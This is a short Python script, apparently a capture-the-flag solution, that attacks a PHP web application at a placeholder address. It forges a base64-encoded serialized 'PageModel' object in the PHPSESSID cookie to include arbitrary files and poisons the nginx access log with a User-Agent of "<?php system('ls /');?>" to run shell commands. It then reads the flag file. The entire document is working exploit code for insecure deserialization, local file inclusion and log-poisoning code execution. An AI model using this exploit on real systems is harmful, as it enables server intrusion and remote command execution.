import requests
import base64

url = 'http://ip:port/index.php'

def SerializeEncode(d: str):
	return base64.b64encode(('O:9:"PageModel":1:{s:4:"file";s:%d:"%s";}' % (len(d), d)).encode('ascii')).decode('ascii')
	
def MakeCookie(d: str):
	return {'PHPSESSID': SerializeEncode(d)}

with requests.Session() as s:
	# access the logs outside root
	# poison them with the user-agent to list the files
	r = s.get(url, cookies=MakeCookie('/var/log/nginx/access.log'), headers={
		'User-Agent': "<?php system('ls /');?>"	# php log poisoning
	})

	# parse through to get the flag file name
	for t in r.text.split('\n'):
		if ('flag' in t):
			rr = s.get(url, cookies=MakeCookie('/{}'.format(t)))
			print(rr.text)	# output flag
			break
